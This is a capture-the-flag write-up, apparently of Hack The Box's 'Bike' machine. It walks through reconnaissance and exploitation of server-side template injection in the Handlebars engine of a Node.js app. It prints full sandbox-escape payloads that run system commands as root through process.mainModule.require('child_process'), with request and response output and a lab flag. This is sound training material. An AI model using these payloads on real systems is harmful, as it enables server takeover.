#custom-applications #nodejs #reconnaissance #remote-code-execution #server-side-template-injection #ssti 

# 0. Theory

This machine focuses on the exploitation of a Server Side Template Injection vulnerability identified in Handlebars, a template engine in Node.js.

## What is Node.js?
Node.js is an open-source, cross-platform, back-end JavaScript runtime environment that can be used to build scalable network applications.

## What is Express?
Express is a minimal and flexible Node.js web application framework that provides a robust set of features for web and mobile applications.

## What is a Template Engine?
Template Engines are used to display dynamically generated content on a web page. They replace the variables inside a template file with actual values and display these values to the client (i.e. a user opening a page through their browser).

For instance, if a developer needs to create a user profile page, which will contain Usernames, Emails, Birthdays and various other content, that is very hard if not impossible to achieve for multiple different users with a static HTML page. The template engine would be used here, along a static "template" that contains the basic structure of the profile page, which would then manually fill in the user information and display it to the user.

Template Engines, like all software, are prone to vulnerabilities. The vulnerability in focus here is called Server Side Template Injection (SSTI).

## What is an SSTI?
**Server-side template injection** is a vulnerability where the attacker injects malicious input into a template in order to execute commands on the server.

To put it plainly an SSTI is an exploitation technique where the attacker injects native (to the Template Engine) code into a web page. The code is then run via the Template Engine and the attacker gains code execution on the affected server.

## Identifying SSTI
In order to exploit a potential SSTI vulnerability we will need to first confirm its existence. After researching for common SSTI payloads on Google, we find [this Hacktricks article](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) that showcases exploitation techniques for various different template engines.
The following image shows how to identify if an SSTI vulnerability exists and how to find out which Template engine is being used. Once the engine is identified a more specific payload can be crafted to allow for remote code execution.
![[Pasted image 20240903134005.png]]

A variety of special characters commonly used in template expressions:
	`{{7*7}}`
	`${7*7}`
	`<%= 7*7 %>`
	`${{7*7}}`
	`#{7*7}`

Some of these payloads can also be seen in the previous image and are used to identify SSTI vulnerabilities. If an SSTI exists, after submitting one of them as input, the web server will detect these expressions as valid code and attempt to execute them.


# 1. Recon

Verify target and availability.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.40]─[scrage@htb-qficte5e6x]─[~]
	└──╼ [★]$ ping 10.129.159.27 -c 4
	PING 10.129.159.27 (10.129.159.27) 56(84) bytes of data.
	64 bytes from 10.129.159.27: icmp_seq=2 ttl=63 time=9.60 ms
	64 bytes from 10.129.159.27: icmp_seq=3 ttl=63 time=7.99 ms
	64 bytes from 10.129.159.27: icmp_seq=4 ttl=63 time=7.97 ms
	
	--- 10.129.159.27 ping statistics ---
	4 packets transmitted, 3 received, 25% packet loss, time 3002ms
	rtt min/avg/max/mdev = 7.969/8.517/9.598/0.763 ms

# 2. Enumeration

Upon performing a port scan we see that **port 22** is open and running `SSH`.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.40]─[scrage@htb-qficte5e6x]─[~]
	└──╼ [★]$ nmap -sV -sC 10.129.159.27
	Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-03 05:33 CDT
	Nmap scan report for 10.129.159.27
	Host is up (0.0099s latency).
	Not shown: 999 closed tcp ports (reset)
	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
	|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
	|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
	
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 1.45 seconds

As we don't have credentials or keys that can be used to authenticate, we try running `nmap` with the verbose flag (`-v`) to see if it can find us more information.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.40]─[scrage@htb-qficte5e6x]─[~]
	└──╼ [★]$ nmap -sV -sC -v 10.129.159.27
	Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-03 05:34 CDT
	
	[*** SNIP ***]
	
	Nmap scan report for 10.129.159.27
	Host is up (0.0087s latency).
	Not shown: 998 closed tcp ports (reset)
	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
	|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
	|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
	80/tcp open  http    Node.js (Express middleware)
	|_http-title:  Bike 
	| http-methods: 
	|_  Supported Methods: GET HEAD POST OPTIONS
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\
	
	[*** SNIP ***]
	
	Nmap done: 1 IP address (1 host up) scanned in 8.47 seconds
	           Raw packets sent: 1004 (44.152KB) | Rcvd: 1002 (40.132KB)


We can see **port 80** is also being open and running a `HTTP` service with `NodeJS` and using the `Express` framework.

Upon visiting the target IP on port 80 in the browser, we are greeted by a webpage under construction, and with the option to subscribe to updates about the page using an email address.

![[Pasted image 20240903124513.png]]

Let's provide a test email to verify we have a working application.
Sometimes, developers put in poor code as a quick solution, leading to vulnerabilities. Let's input the email `pwninx@hackthebox.eu` and click submit.

When clicking on the Submit button, the page refreshes and we get the following output:

![[Pasted image 20240903125114.png]]

The output shows that whatever input the user is submitted in the Email field, gets reflected back to the user once the page reloads.
This could potentially give us some ideas for exploitation vectors such as **Cross Site Scripting** (**XSS**). But we need to know what frameworks and coding languages the website uses on its back-end, first.

We can give a try to using Wappalyzer to scan for technologies being used for the target web application.

![[Pasted image 20240903125520.png]]

Both the nmap scan and Wappalyzer confirmed that the website is running on NodeJS and is using the Express framework.

With this information in mind we can start identifying potential exploitation paths. Various attempts at verifying an `XSS` vulnerability with default payloads, such as `<script>alert(1)</script>`, have been unsuccessful. For this reason we must look for a different vulnerability.

Node.js and Python web backend servers often make use of **Template Engines**.
**SSTI** attack is very common on Node.js websites and there is a good possibility that a Template Engine is being used to reflect the email that the user inputs in the contact field.

To test for the vulnerability lets try inputting `${7*7}` into the email submission form.
The server did not execute the expression and only reflected it back to us. Let's move on to the second payload, which is `{{7*7}}`.

After this payload is submitted, an error page pops up:

![[Pasted image 20240903134758.png]]

This means that the payload was indeed detected as valid by the template engine, however the code had some error and was unable to be executed. An error is not always a bad thing.
For a Penetration Tester, it can provide valuable information. In this case we can see that the server is running from the `/root/Backend` directory and also that the `Handlebars` Template Engine is being used.

# 3. Foothold

Looking back at the [HackTricks page](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs), we can see that both Handlebars and Node.js are mentioned, as well as a payload that can be used to potentially run commands on a Handlebars SSTI.

To determine if this is the case, we can use `Burpsuite` to capture a POST request via `FoxyProxy` and edit it to include our payload.
After BurpSuite has been started and the proxy configured correctly, we submit the payload again, so that BurpSuite captures the request and allow us to edit it.

	POST / HTTP/1.1
	Host: 10.129.97.64
	User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
	Accept-Language: en-US,en;q=0.5
	Accept-Encoding: gzip, deflate, br
	Referer: http://10.129.97.64/
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 35
	Origin: http://10.129.97.64
	DNT: 1
	Connection: close
	Upgrade-Insecure-Requests: 1
	Sec-GPC: 1
	
	email=%7B%7B7*7%7D%7D&action=Submit


Before we modify the request, let's send this HTTP packet to the `Repeater` module of BurpSuite by pressing `CTRL+R` .
Now let's grab a payload from the section that is titled "`Handlebars (NodeJS)`" in the [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) website.

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

This line is the main focus in this exercise:

`{{this.push "return require('child_process').exec('whoami');"}}`

This line instructs the server to execute a specific system command (in this case `whoami`).


### URL Encoding

When making a request to a web server, the data that we send can only contain certain characters from the standard 128 character ASCII set. Reserved characters that do not belong to this set must be encoded. For this reason we use an encoding procedure that is called `URL Encoding`.

With this process for instance, the reserved character `&` becomes `%26`.
Luckily, BurpSuite has a tab called `Decoder` that allows us to either decode or encode the text of our choice with various different encoding methods, including URL.

Let's paste the above payload into the top pane of the Decoder and select `Encode as > URL`.

![[Pasted image 20240914150527.png]]

We copy the URL encoded payload that is in the bottom pane, and paste it in the `email=` field via the `request` tab.
Then we click the `Send` button in the top of the `Repeater` page.

![[Pasted image 20240914150948.png]]

In the response, we can read an error: `"ReferenceError: require is not defined"`.
Taking a look at the payload we notice this piece of code:

	{{this.push "return require('child_process').exec('whoami');"}}

This is likely the part of the payload that is erroring out. `require` is a keyword in JavaScript and more specifically Node.js that is used to load code from other modules or files. The above code is attempting to load the Child Process module into memory and use it to execute system commands (in this case `whoami`).

Template Engines are often Sandboxed, meaning their code runs in a restricted code space so that in the event of malicious code being run, it will be very hard to load modules that can run system commands. If we cannot directly use `require` to load such modules, we will have to find a different way.


### Globals

In programming, "Globals" are variables that are globally accessible throughout the program. In Node.js this works similarly, with Global objects being available in all loaded modules. A quick Google search using the keywords `Node.js Global Scope` reveals [this](https://nodejs.org/api/globals.html) documentation that details all of the available Global Objects in Node.js. It is worth noting that the [documentation](https://nodejs.org/api/globals.html#global-objects) also showcases a list of variables that appear to be global objects, but in fact are [built-in](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects) objects. These are the following:

	__dirname
	__filename
	exports
	module
	require()

`require` is in fact not in the global scope and therefore in specific cases it might not be accessible. Taking a closer look at the documentation we see that there is a [process](https://nodejs.org/api/process.html#process) object available. The documentation states that this object *provides information about, and control over, the current Node.js process.* We might be able to use this object to load a module. Let's see if we can call it from the SSTI. Modify your payload as follows:

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process;"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
	        {{this}}
	      {{/with}}
	    {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

URL encoding the payload as done previously and sending it using BurpSuite's Repeater:


    <p class="result">
        We will contact you at:       e
      2
      [object Object]
        function Function() { [native code] }
        2
        [object Object]
	        [object process]

    </p>


The response did not contain an error and we can see the `[object process]` has been included. This means that the process object is indeed available.

Taking a closer look at the [documentation](https://nodejs.org/api/process.html) of the process object, we see that it has a [mainModule](https://nodejs.org/api/process.html#processmainmodule) property that has been deprecated since version 14.0.0 of Node.js, however, deprecated does not necessarily mean inaccessible. A quick Google search using the keywords `Node.js mainModule` reveals [this](https://www.geeksforgeeks.org/node-js-process-mainmodule-property/) blog post that details the usage of this property.

Specifically, it mentions that this property *returns an object that contains the reference of main module.* Since handlebars is running in a sandboxed environment, we might be able to use the mainModule property to directly load the main function and since the main function is most probably not sandboxed, load require from there. Let's modify our payload once more to see if `mainModule` is accessible.

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule;"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```


URL encoding the payload and sending it using the Repeater again, we get the following response:


    <p class="result">
        We will contact you at:       e
      2
      [object Object]
        function Function() { [native code] }
        2
        [object Object]
        [object Object]

    </p>


No error this time either and we see an extra object at the end of the response, which means the property is indeed available. Now lets attempt to call `require` and load a module. We can load the `child_process` module as it is available on default Node.js installations and can be used to execute system commands.

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
	  {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

In the response:

    <p class="result">
        We will contact you at:       e
      2
      [object Object]
        function Function() { [native code] }
        2
        [object Object]
            [object Object]

    </p>



The `require` object has been called successfully and the `child_process` module loaded. Let's now attempt to run system commands.

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').execSync('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```


In the response:

    <p class="result">
        We will contact you at:       e
      2
      [object Object]
        function Function() { [native code] }
        2
        [object Object]
            root


    </p>

![[Pasted image 20240914161048.png]]

In the response we see that the output of the `whoami` command is `root`. This means that we have successfully run system commands on the box and also that the web server is running in the context of the root user.

We can now proceed one of two ways:
We can either get a Reverse Shell on the affected system, or, for this exercise, directly grab the flag.

We know that the flag is most probably located in `/root` but we can also verify this. Let's change our command from `whoami` to `ls /root` to list all files and folders in the root directory.

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').execSync('ls /root');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

In the response:

    <p class="result">
        We will contact you at:       e
      2
      [object Object]
        function Function() { [native code] }
        2
        [object Object]
            Backend
			flag.txt
			snap

    </p>


So now all we need to do is to make the server to execute a `cat` command on that `flag.txt` file:

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').execSync('cat /root/flag.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

Response fragment:


    <p class="result">
        We will contact you at:       e
      2
      [object Object]
        function Function() { [native code] }
        2
        [object Object]
        6b258d726d287462d60c103d0142a81c

    </p>


Flag exfiltrated: `6b258d726d287462d60c103d0142a81c`



https://www.hackthebox.com/achievement/machine/2057492/449
![[Pasted image 20240914162246.png]]